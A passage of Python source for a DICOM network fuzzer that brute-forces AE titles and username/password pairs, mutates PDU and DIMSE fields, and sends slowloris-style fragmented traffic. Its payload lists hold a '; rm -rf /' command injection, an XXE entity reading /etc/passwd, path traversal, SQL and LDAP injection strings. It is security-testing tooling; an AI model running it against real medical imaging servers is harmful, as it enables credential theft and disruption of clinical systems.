                    yield FuzzResult(
                        test_name="rapid_echo_burst",
                        test_category=category,
                        success=True,
                        notes="Sent 10 C-ECHOs without waiting"
                    )
        
        # Test 2: Mixed command types
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    # C-ECHO
                    conn.send_raw(self._build_echo_pdata())
                    # C-FIND (even if not negotiated)
                    find_dimse = C_FIND_RQ(message_id=2)
                    find_pdv = PresentationDataValueItem(
                        context_id=1,
                        data=bytes(find_dimse),
                        is_command=1,
                        is_last=1
                    )
                    conn.send_raw(bytes(DICOM() / P_DATA_TF(pdv_items=[find_pdv])))
                    yield FuzzResult(
                        test_name="mixed_dimse_commands",
                        test_category=category,
                        success=True,
                        notes="Sent C-ECHO then C-FIND"
                    )
    
    def _rapid_state_transitions(self) -> Generator[FuzzResult, None, None]:
        """Rapid state transitions to stress test state machine."""
        category = "state_rapid"
        
        # Test: Rapid connect/associate/release cycles
        for i in range(5 if self.intensity == FuzzIntensity.LOW else 20):
            with self._create_connection() as conn:
                if conn.connect():
                    conn.send_raw(self._build_valid_associate_rq())
                    conn.recv_pdu(timeout=1)
                    conn.send_raw(bytes(DICOM() / A_RELEASE_RQ()))
            
            yield FuzzResult(
                test_name=f"rapid_cycle_{i}",
                test_category=category,
                success=True,
                notes="Rapid connect/associate/release"
            )


# =============================================================================
# Authentication Fuzzer
# =============================================================================

class AuthenticationFuzzer(BaseFuzzer):
    """
    Fuzzer for DICOM authentication mechanisms.
    
    Attacks:
    - AE Title brute forcing
    - User Identity negotiation attacks
    - Credential stuffing
    - Format string attacks in credentials
    """
    
    def __init__(self, target: TargetConfig, intensity: FuzzIntensity = FuzzIntensity.MEDIUM,
                 ae_wordlist: str = None, user_wordlist: str = None, pass_wordlist: str = None):
        super().__init__(target, intensity)
        
        self.ae_titles = load_wordlist(ae_wordlist) if ae_wordlist else DEFAULT_AE_TITLES.copy()
        self.usernames = load_wordlist(user_wordlist) if user_wordlist else DEFAULT_USERNAMES.copy()
        self.passwords = load_wordlist(pass_wordlist) if pass_wordlist else DEFAULT_PASSWORDS.copy()
        
        # Track successful credentials
        self.valid_ae_titles: List[str] = []
        self.valid_credentials: List[Tuple[str, str]] = []
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("ae_title_bruteforce", self._ae_title_bruteforce),
            ("ae_title_fuzzing", self._ae_title_fuzzing),
            ("user_identity_bruteforce", self._user_identity_bruteforce),
            ("user_identity_fuzzing", self._user_identity_fuzzing),
            ("user_identity_type_fuzzing", self._user_identity_type_fuzzing),
        ]
    
    def _build_associate_with_ae(self, called_ae: str, calling_ae: str = None) -> bytes:
        """Build A-ASSOCIATE-RQ with specific AE titles."""
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
        user_info = build_user_information(max_pdu_length=self.target.max_pdu_length)
        
        return bytes(DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=called_ae,
            calling_ae_title=calling_ae or self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        ))
    
    def _build_associate_with_user_identity(self, user_type: int, primary: bytes,
                                           secondary: bytes = None,
                                           response_requested: int = 1) -> bytes:
        """Build A-ASSOCIATE-RQ with User Identity negotiation."""
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
        
        # Build user info with identity
        max_len = DICOMVariableItem() / DICOMMaximumLength(max_pdu_length=self.target.max_pdu_length)
        
        user_identity_kwargs = {
            "user_identity_type": user_type,
            "positive_response_requested": response_requested,
            "primary_field": primary,
        }
        if user_type == 2 and secondary:
            user_identity_kwargs["secondary_field"] = secondary
        
        user_id = DICOMVariableItem() / DICOMUserIdentity(**user_identity_kwargs)
        user_info = DICOMVariableItem() / DICOMUserInformation(sub_items=[max_len, user_id])
        
        return bytes(DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        ))
    
    def _ae_title_bruteforce(self) -> Generator[FuzzResult, None, None]:
        """Brute force AE titles from wordlist."""
        category = "auth_ae_bruteforce"
        
        for ae_title in self.ae_titles:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                assoc = self._build_associate_with_ae(ae_title)
                start = time.time()
                conn.send_raw(assoc)
                resp = conn.recv_pdu(timeout=3)
                duration = (time.time() - start) * 1000
                
                if resp:
                    pdu_type, raw = resp
                    if pdu_type == PDU_TYPE_ASSOCIATE_AC:
                        self.valid_ae_titles.append(ae_title)
                        log.info(f"[+] Valid AE Title found: {ae_title}")
                        yield FuzzResult(
                            test_name=f"ae_bruteforce_{ae_title}",
                            test_category=category,
                            success=True,
                            response_type="A-ASSOCIATE-AC",
                            notes=f"AE Title '{ae_title}' accepted!",
                            duration_ms=duration
                        )
                    else:
                        yield FuzzResult(
                            test_name=f"ae_bruteforce_{ae_title}",
                            test_category=category,
                            success=True,
                            response_type=f"PDU_0x{pdu_type:02X}",
                            duration_ms=duration
                        )
                else:
                    yield FuzzResult(
                        test_name=f"ae_bruteforce_{ae_title}",
                        test_category=category,
                        success=True,
                        response_type="NO_RESPONSE",
                        duration_ms=duration
                    )
    
    def _ae_title_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz AE title format and content."""
        category = "auth_ae_fuzz"
        
        fuzz_ae_titles = [
            ("empty", b""),
            ("null_16", b"\x00" * 16),
            ("spaces", b" " * 16),
            ("long_64", b"A" * 64),
            ("long_256", b"A" * 256),
            ("unicode", "日本語ÄÖÜ".encode('utf-8')[:16]),
            ("control_chars", bytes(range(16))),
            ("high_bytes", bytes(range(128, 144))),
            ("null_terminated", b"AE_TITLE\x00\x00\x00\x00\x00\x00\x00\x00"),
            ("null_middle", b"AE\x00TITLE\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
            ("format_string", b"%s%s%s%s%s%s%s%s"),
            ("format_n", b"%n%n%n%n%n%n%n%n"),
            ("sql_inject", b"'; DROP TABLE--"),
            ("xss", b"<script>alert(1)"),
            ("path_traversal", b"../../../etc/passwd"),
            ("command_inject", b"; rm -rf /"),
            ("ldap_inject", b"*)(uid=*))(|(uid=*"),
            ("xml_inject", b"<![CDATA[<]]>"),
            ("special_chars", b"!@#$%^&*(){}[]|\\"),
        ]
        
        for name, ae_bytes in fuzz_ae_titles:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                # Test as called AE
                assoc = self._build_associate_with_ae(ae_bytes)
                result = self._send_and_check(conn, assoc, f"called_ae_{name}", category)
                yield result
            
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                # Test as calling AE
                assoc = self._build_associate_with_ae(self.target.ae_title, ae_bytes)
                result = self._send_and_check(conn, assoc, f"calling_ae_{name}", category)
                yield result
    
    def _user_identity_bruteforce(self) -> Generator[FuzzResult, None, None]:
        """Brute force username/password combinations."""
        category = "auth_credential_bruteforce"
        
        # Type 1: Username only
        for username in self.usernames:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                assoc = self._build_associate_with_user_identity(1, username.encode())
                start = time.time()
                conn.send_raw(assoc)
                resp = conn.recv_pdu(timeout=3)
                duration = (time.time() - start) * 1000
                
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    log.info(f"[+] Username accepted: {username}")
                    yield FuzzResult(
                        test_name=f"user_only_{username}",
                        test_category=category,
                        success=True,
                        response_type="A-ASSOCIATE-AC",
                        notes=f"Username '{username}' accepted!",
                        duration_ms=duration
                    )
                else:
                    yield FuzzResult(
                        test_name=f"user_only_{username}",
                        test_category=category,
                        success=True,
                        response_type=f"PDU_0x{resp[0]:02X}" if resp else "NO_RESPONSE",
                        duration_ms=duration
                    )
        
        # Type 2: Username + Password
        for username in self.usernames:
            for password in self.passwords:
                with self._create_connection() as conn:
                    if not conn.connect():
                        continue
                    
                    assoc = self._build_associate_with_user_identity(
                        2, username.encode(), password.encode()
                    )
                    start = time.time()
                    conn.send_raw(assoc)
                    resp = conn.recv_pdu(timeout=3)
                    duration = (time.time() - start) * 1000
                    
                    if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                        self.valid_credentials.append((username, password))
                        log.info(f"[+] Valid credentials: {username}:{password}")
                        yield FuzzResult(
                            test_name=f"user_pass_{username}_{password}",
                            test_category=category,
                            success=True,
                            response_type="A-ASSOCIATE-AC",
                            notes=f"Credentials '{username}:{password}' accepted!",
                            duration_ms=duration
                        )
                    else:
                        yield FuzzResult(
                            test_name=f"user_pass_{username}_{password}",
                            test_category=category,
                            success=True,
                            response_type=f"PDU_0x{resp[0]:02X}" if resp else "NO_RESPONSE",
                            duration_ms=duration
                        )
    
    def _user_identity_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz User Identity field contents."""
        category = "auth_identity_fuzz"
        
        fuzz_primaries = [
            ("empty", b""),
            ("null_256", b"\x00" * 256),
            ("long_1k", b"A" * 1024),
            ("long_64k", b"A" * 65535),
            ("binary", bytes(range(256))),
            ("format_string", b"%s" * 100),
            ("format_n", b"%n" * 50),
            ("sql_union", b"' UNION SELECT * FROM users--"),
            ("ldap", b"*)(objectClass=*"),
            ("xml", b"<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
            ("json", b'{"admin":true,"role":"superuser"}'),
        ]
        
        for name, primary in fuzz_primaries:
            # Type 1: Username
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                assoc = self._build_associate_with_user_identity(1, primary)
                yield self._send_and_check(conn, assoc, f"identity_type1_{name}", category)
            
            # Type 2: Username + Password
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                assoc = self._build_associate_with_user_identity(2, primary, primary)
                yield self._send_and_check(conn, assoc, f"identity_type2_{name}", category)
    
    def _user_identity_type_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz User Identity type field."""
        category = "auth_identity_type"
        
        # Test all possible type values
        for identity_type in range(256):
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                try:
                    assoc = self._build_associate_with_user_identity(
                        identity_type, b"testuser", b"testpass"
                    )
                    yield self._send_and_check(conn, assoc, f"identity_type_{identity_type}", category)
                except Exception as e:
                    yield FuzzResult(
                        test_name=f"identity_type_{identity_type}",
                        test_category=category,
                        success=False,
                        error_message=str(e)
                    )
        
        # Test response_requested values
        for req in [0, 1, 2, 127, 128, 255]:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                assoc = self._build_associate_with_user_identity(
                    1, b"user", response_requested=req
                )
                yield self._send_and_check(conn, assoc, f"identity_response_req_{req}", category)


# =============================================================================
# PDU Structure Fuzzer
# =============================================================================

class PDUFuzzer(BaseFuzzer):
    """
    Deep fuzzing of PDU structures.
    
    Attacks:
    - Length field manipulation (overflow, underflow, mismatch)
    - Reserved field fuzzing
    - Unknown PDU types
    - Malformed headers
    - Fragmentation attacks
    """
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("pdu_length_attacks", self._pdu_length_attacks),
            ("pdu_type_fuzzing", self._pdu_type_fuzzing),
            ("pdu_reserved_fields", self._pdu_reserved_fields),
            ("pdu_fragmentation", self._pdu_fragmentation),
            ("pdu_truncation", self._pdu_truncation),
            ("variable_item_fuzzing", self._variable_item_fuzzing),
            ("presentation_context_fuzzing", self._presentation_context_fuzzing),
        ]
    
    def _build_base_associate_rq(self) -> bytes:
        """Build valid A-ASSOCIATE-RQ as base for mutations."""
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
        user_info = build_user_information(max_pdu_length=self.target.max_pdu_length)
        
        return bytes(DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        ))
    
    def _pdu_length_attacks(self) -> Generator[FuzzResult, None, None]:
        """Attack PDU length field."""
        category = "pdu_length"
        base = self._build_base_associate_rq()
        actual_len = struct.unpack("!I", base[2:6])[0]
        
        # Test various length values
        test_lengths = [
            ("zero", 0),
            ("one", 1),
            ("minus_one", actual_len - 1),
            ("plus_one", actual_len + 1),
            ("minus_10", max(0, actual_len - 10)),
            ("plus_10", actual_len + 10),
            ("plus_100", actual_len + 100),
            ("plus_1000", actual_len + 1000),
            ("half", actual_len // 2),
            ("double", actual_len * 2),
            ("max_16bit", 0xFFFF),
            ("max_32bit", 0xFFFFFFFF),
            ("max_signed", 0x7FFFFFFF),
            ("negative_1", 0x80000000),  # Would be -2^31 if signed
        ]
        
        for name, length in test_lengths:
            mutated = bytearray(base)
            mutated[2:6] = struct.pack("!I", length & 0xFFFFFFFF)
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"length_{name}", category)
    
    def _pdu_type_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz PDU type byte."""
        category = "pdu_type"
        base = self._build_base_associate_rq()
        
        # Test all possible PDU type values
        for pdu_type in range(256):
            mutated = bytearray(base)
            mutated[0] = pdu_type
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"type_0x{pdu_type:02X}", category)
    
    def _pdu_reserved_fields(self) -> Generator[FuzzResult, None, None]:
        """Fuzz reserved fields in PDUs."""
        category = "pdu_reserved"
        base = self._build_base_associate_rq()
        
        # Reserved byte in PDU header (byte 1)
        for val in [0x01, 0x7F, 0x80, 0xFF]:
            mutated = bytearray(base)
            mutated[1] = val
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"pdu_reserved_{val:02X}", category)
        
        # Reserved fields in A-ASSOCIATE-RQ (bytes 8-9 and 42-73)
        for offset, name in [(8, "reserved1"), (9, "reserved2")]:
            for val in [0xFF, 0x80, 0x7F]:
                mutated = bytearray(base)
                if offset < len(mutated):
                    mutated[offset] = val
                    
                    with self._create_connection() as conn:
                        if conn.connect():
                            yield self._send_and_check(conn, bytes(mutated), f"assoc_{name}_{val:02X}", category)
        
        # 32-byte reserved field (bytes 42-73)
        for pattern in [b"\xFF" * 32, b"\x00\xFF" * 16, bytes(range(32))]:
            mutated = bytearray(base)
            if len(mutated) >= 74:
                mutated[42:74] = pattern
                
                with self._create_connection() as conn:
                    if conn.connect():
                        yield self._send_and_check(conn, bytes(mutated), f"assoc_reserved32_{pattern[:4].hex()}", category)
    
    def _pdu_fragmentation(self) -> Generator[FuzzResult, None, None]:
        """Test PDU fragmentation handling."""
        category = "pdu_fragmentation"
        base = self._build_base_associate_rq()
        
        # Various fragmentation points
        fragment_points = [1, 2, 3, 4, 5, 6, 7, 8, 16, 32, 64, len(base) // 2]
        
        for frag_point in fragment_points:
            if frag_point >= len(base):
                continue
            
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                # Send first fragment
                conn.send_raw(base[:frag_point])
                
                # Various delays
                for delay in [0, 0.001, 0.01, 0.1]:
                    time.sleep(delay)
                
                # Send rest
                result = self._send_and_check(conn, base[frag_point:], f"frag_at_{frag_point}", category)
                yield result
        
        # Byte-by-byte send (slowloris-style)
        with self._create_connection() as conn:
            if conn.connect():
                for i, byte in enumerate(base):
                    conn.send_raw(bytes([byte]))
                    if i < 10:
                        time.sleep(0.001)
                
                resp = conn.recv_pdu(timeout=5)
                yield FuzzResult(
                    test_name="byte_by_byte",
                    test_category=category,
                    success=resp is not None,
                    response_type=f"PDU_0x{resp[0]:02X}" if resp else "NO_RESPONSE"
                )
    
    def _pdu_truncation(self) -> Generator[FuzzResult, None, None]:
        """Test handling of truncated PDUs."""
        category = "pdu_truncation"
        base = self._build_base_associate_rq()
        
        # Truncate at various points
        truncation_points = [1, 2, 3, 4, 5, 6, 10, 20, 50, 100, len(base) - 1]
        
        for trunc_point in truncation_points:
            if trunc_point >= len(base):
                continue
            
            truncated = base[:trunc_point]
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, truncated, f"truncate_{trunc_point}", category)
    
    def _variable_item_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz variable items in A-ASSOCIATE-RQ."""
        category = "variable_item"
        
        # Test with no variable items
        pdu = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[]
        )
        with self._create_connection() as conn:
            if conn.connect():
                yield self._send_and_check(conn, bytes(pdu), "no_variable_items", category)
        
        # Test with invalid item types
        for item_type in [0x00, 0x11, 0x22, 0x60, 0x70, 0x80, 0xFF]:
            raw_item = struct.pack("!BBH", item_type, 0, 4) + b"TEST"
            
            # Insert invalid item
            base = self._build_base_associate_rq()
            mutated = base[:74] + raw_item + base[74:]
            # Update length
            new_len = len(mutated) - 6
            mutated = bytearray(mutated)
            mutated[2:6] = struct.pack("!I", new_len)
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"item_type_0x{item_type:02X}", category)
        
        # Test with malformed item lengths
        for item_len in [0, 0xFFFF, 0x7FFF]:
            raw_item = struct.pack("!BBH", ITEM_TYPE_APP_CONTEXT, 0, item_len)
            if item_len < 100:
                raw_item += b"\x00" * item_len
            
            base = self._build_base_associate_rq()
            mutated = base[:74] + raw_item
            mutated = bytearray(mutated)
            new_len = len(mutated) - 6
            mutated[2:6] = struct.pack("!I", new_len)
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"item_len_{item_len}", category)
        
        # Duplicate items
        app_ctx = bytes(DICOMVariableItem() / DICOMApplicationContext())
        base = self._build_base_associate_rq()
        
        for num_dupes in [2, 5, 10, 100]:
            mutated = base[:74] + (app_ctx * num_dupes) + base[74:]
            mutated = bytearray(mutated)
            new_len = len(mutated) - 6
            mutated[2:6] = struct.pack("!I", new_len)
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(mutated), f"duplicate_app_ctx_{num_dupes}", category)
    
    def _presentation_context_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz presentation context negotiation."""
        category = "presentation_context"
        
        # Invalid context IDs
        for ctx_id in [0, 2, 254, 255]:  # 0 is invalid, even numbers are invalid
            app_ctx = DICOMVariableItem() / DICOMApplicationContext()
            
            abs_syn = DICOMVariableItem() / DICOMAbstractSyntax(uid=_uid_to_bytes(VERIFICATION_SOP_CLASS_UID))
            ts = DICOMVariableItem() / DICOMTransferSyntax()
            pctx = DICOMVariableItem() / DICOMPresentationContextRQ(
                context_id=ctx_id,
                sub_items=[abs_syn, ts]
            )
            user_info = build_user_information()
            
            pdu = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title=self.target.ae_title,
                calling_ae_title=self.target.calling_ae,
                variable_items=[app_ctx, pctx, user_info]
            )
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(pdu), f"ctx_id_{ctx_id}", category)
        
        # Many presentation contexts
        for num_contexts in [10, 50, 128, 256]:
            app_ctx = DICOMVariableItem() / DICOMApplicationContext()
            contexts = []
            
            for i in range(num_contexts):
                ctx_id = (i * 2 + 1) % 256 or 1  # Odd numbers, wrap around
                abs_syn = DICOMVariableItem() / DICOMAbstractSyntax(uid=_uid_to_bytes(VERIFICATION_SOP_CLASS_UID))
                ts = DICOMVariableItem() / DICOMTransferSyntax()
                pctx = DICOMVariableItem() / DICOMPresentationContextRQ(
                    context_id=ctx_id,
                    sub_items=[abs_syn, ts]
                )
                contexts.append(pctx)
            
            user_info = build_user_information()
            
            try:
                pdu = DICOM() / A_ASSOCIATE_RQ(
                    called_ae_title=self.target.ae_title,
                    calling_ae_title=self.target.calling_ae,
                    variable_items=[app_ctx] + contexts + [user_info]
                )
                
                with self._create_connection() as conn:
                    if conn.connect():
                        yield self._send_and_check(conn, bytes(pdu), f"many_contexts_{num_contexts}", category)
            except Exception as e:
                yield FuzzResult(
                    test_name=f"many_contexts_{num_contexts}",
                    test_category=category,
                    success=False,
                    error_message=str(e)
                )
        
        # Malformed UIDs in presentation context
        for uid_type, uid_bytes in [
            ("empty", b""),
            ("odd_length", b"1.2.3"),
            ("null", b"\x00" * 16),
            ("long", b"1." + b"2" * 100),
            ("invalid_chars", b"1.2.3.ABC.4"),
        ]:
            app_ctx = DICOMVariableItem() / DICOMApplicationContext()
            abs_syn = DICOMVariableItem() / DICOMAbstractSyntax(uid=uid_bytes)
            ts = DICOMVariableItem() / DICOMTransferSyntax(uid=uid_bytes)
            pctx = DICOMVariableItem() / DICOMPresentationContextRQ(
                context_id=1,
                sub_items=[abs_syn, ts]
            )
            user_info = build_user_information()
            
            pdu = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title=self.target.ae_title,
                calling_ae_title=self.target.calling_ae,
                variable_items=[app_ctx, pctx, user_info]
            )
            
            with self._create_connection() as conn:
                if conn.connect():
                    yield self._send_and_check(conn, bytes(pdu), f"uid_{uid_type}", category)


# =============================================================================
# DIMSE Command Fuzzer
# =============================================================================

class DIMSEFuzzer(BaseFuzzer):
    """
    Fuzzer for DIMSE command layer.
    
    Attacks:
    - All DIMSE command types
    - Invalid command fields
    - Group length manipulation
    - Message ID attacks
    - Data set type mismatches
    """
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("dimse_command_field_fuzzing", self._command_field_fuzzing),
            ("dimse_message_id_fuzzing", self._message_id_fuzzing),
            ("dimse_group_length_fuzzing", self._group_length_fuzzing),
            ("dimse_all_commands", self._all_dimse_commands),
            ("dimse_n_commands", self._n_command_fuzzing),
            ("dimse_dataset_type_fuzzing", self._dataset_type_fuzzing),
            ("dimse_uid_fuzzing", self._uid_fuzzing),
            ("dimse_pdv_fuzzing", self._pdv_fuzzing),
        ]
    
    def _establish_association(self, conn: RawDICOMConnection,
                               contexts: Dict[str, List[str]] = None) -> Optional[int]:
        """Establish association and return accepted context ID."""
        if contexts is None:
            contexts = {VERIFICATION_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID]}
        
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        
        pctx_items = []
        ctx_id = 1
        for abs_syn, ts_list in contexts.items():
            pctx = build_presentation_context_rq(ctx_id, abs_syn, ts_list)
            pctx_items.append(pctx)
            ctx_id += 2
        
        user_info = build_user_information(max_pdu_length=self.target.max_pdu_length)
        
        assoc = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx] + pctx_items + [user_info]
        )
        
        conn.send_raw(bytes(assoc))
        resp = conn.recv_pdu(timeout=5)
        
        if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
            # Parse to find accepted context
            try:
                parsed = DICOM(resp[1])
                if parsed.haslayer(A_ASSOCIATE_AC):
                    for item in parsed[A_ASSOCIATE_AC].variable_items:
                        if item.item_type == 0x21:
                            pctx_ac = item[DICOMPresentationContextAC]
                            if pctx_ac.result == 0:
                                return pctx_ac.context_id
            except Exception:
                pass
            return 1  # Assume context 1 if parsing fails
        
        return None
    
    def _build_dimse_pdata(self, dimse_bytes: bytes, ctx_id: int,
                           is_command: int = 1, is_last: int = 1) -> bytes:
        """Build P-DATA-TF with DIMSE command."""
        pdv = PresentationDataValueItem(
            context_id=ctx_id,
            data=dimse_bytes,
            is_command=is_command,
            is_last=is_last
        )
        return bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
    
    def _command_field_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz DIMSE command field values."""
        category = "dimse_command_field"
        
        # All valid and invalid command field values
        command_values = [
            0x0000, 0x0001, 0x0010, 0x0020, 0x0021, 0x0030,
            0x0100, 0x0110, 0x0120, 0x0130, 0x0140, 0x0150,
            0x0FFF,
            0x8001, 0x8010, 0x8020, 0x8021, 0x8030,
            0x8100, 0x8110, 0x8120, 0x8130, 0x8140, 0x8150,
            # Invalid values
            0x0002, 0x0003, 0x00FF, 0x1000, 0x7FFF, 0x8000,
            0xDEAD, 0xBEEF, 0xFFFF, 0x8FFF,
        ]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn)
            if not ctx_id:
                return
            
            for cmd_val in command_values:
                # Build C-ECHO with modified command field
                dimse = C_ECHO_RQ(message_id=random.randint(1, 65535))
                dimse.command_field = cmd_val
                
                pdata = self._build_dimse_pdata(bytes(dimse), ctx_id)
                yield self._send_and_check(conn, pdata, f"cmd_field_0x{cmd_val:04X}", category)
    
    def _message_id_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz DIMSE message ID field."""
        category = "dimse_message_id"
        
        message_ids = [0, 1, 0x7FFF, 0x8000, 0xFFFE, 0xFFFF]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn)
            if not ctx_id:
                return
            
            for msg_id in message_ids:
                dimse = C_ECHO_RQ(message_id=msg_id)
                pdata = self._build_dimse_pdata(bytes(dimse), ctx_id)
                yield self._send_and_check(conn, pdata, f"msg_id_{msg_id}", category)
            
            # Duplicate message IDs
            dimse1 = C_ECHO_RQ(message_id=42)
            dimse2 = C_ECHO_RQ(message_id=42)
            conn.send_raw(self._build_dimse_pdata(bytes(dimse1), ctx_id))
            yield self._send_and_check(
                conn, self._build_dimse_pdata(bytes(dimse2), ctx_id),
                "duplicate_msg_id", category
            )
    
    def _group_length_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz DIMSE command group length."""
        category = "dimse_group_length"
        
        # Build base C-ECHO and manipulate group length
        group_lengths = [0, 1, 10, 100, 0x7FFFFFFF, 0xFFFFFFFF]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn)
            if not ctx_id:
                return
            
            for grp_len in group_lengths:
                # Build DIMSE with explicit group length
                dimse = C_ECHO_RQ(message_id=random.randint(1, 65535))
                raw = bytes(dimse)
                
                # Modify group length (bytes 8-11 after the tag/length header)
                if len(raw) >= 12:
                    mutated = bytearray(raw)
                    mutated[8:12] = struct.pack("<I", grp_len)
                    
                    pdata = self._build_dimse_pdata(bytes(mutated), ctx_id)
                    yield self._send_and_check(conn, pdata, f"grp_len_0x{grp_len:08X}", category)
    
    def _all_dimse_commands(self) -> Generator[FuzzResult, None, None]:
        """Test all DIMSE command types."""
        category = "dimse_all_commands"
        
        contexts = {
            VERIFICATION_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID],
            CT_IMAGE_STORAGE_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID],
            PATIENT_ROOT_QR_FIND_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID],
            PATIENT_ROOT_QR_MOVE_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID],
            PATIENT_ROOT_QR_GET_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID],
        }
        
        dimse_commands = [
            ("C_ECHO_RQ", C_ECHO_RQ(message_id=1)),
            ("C_STORE_RQ", C_STORE_RQ(
                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
                affected_sop_instance_uid=generate_random_uid(),
                message_id=2
            )),
            ("C_FIND_RQ", C_FIND_RQ(message_id=3)),
            ("C_MOVE_RQ", C_MOVE_RQ(message_id=4, move_destination=b"DEST_AE")),
            ("C_GET_RQ", C_GET_RQ(message_id=5)),
            # Responses (shouldn't be sent by SCU, but test anyway)
            ("C_ECHO_RSP", C_ECHO_RSP(message_id_responded=1, status=0x0000)),
            ("C_STORE_RSP", C_STORE_RSP(
                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
                affected_sop_instance_uid=generate_random_uid(),
                message_id_responded=2,
                status=0x0000
            )),
        ]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn, contexts)
            if not ctx_id:
                return
            
            for name, dimse in dimse_commands:
                pdata = self._build_dimse_pdata(bytes(dimse), ctx_id)
                yield self._send_and_check(conn, pdata, name, category)
    
    def _n_command_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz N-* DIMSE commands (typically used for MPPS, Storage Commitment)."""
        category = "dimse_n_commands"
        
        # Build raw N-* commands since we don't have full packet classes
        n_commands = [
            ("N_EVENT_REPORT_RQ", DIMSE_N_EVENT_REPORT_RQ),
            ("N_GET_RQ", DIMSE_N_GET_RQ),
            ("N_SET_RQ", DIMSE_N_SET_RQ),
            ("N_ACTION_RQ", DIMSE_N_ACTION_RQ),
            ("N_CREATE_RQ", DIMSE_N_CREATE_RQ),
            ("N_DELETE_RQ", DIMSE_N_DELETE_RQ),
        ]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn)
            if not ctx_id:
                return
            
            for name, cmd_field in n_commands:
                # Build minimal N-command DIMSE
                dimse = C_ECHO_RQ(message_id=random.randint(1, 65535))
                dimse.command_field = cmd_field
                
                pdata = self._build_dimse_pdata(bytes(dimse), ctx_id)
                yield self._send_and_check(conn, pdata, name, category)
    
    def _dataset_type_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz data set type field."""
        category = "dimse_dataset_type"
        
        # Data set type values
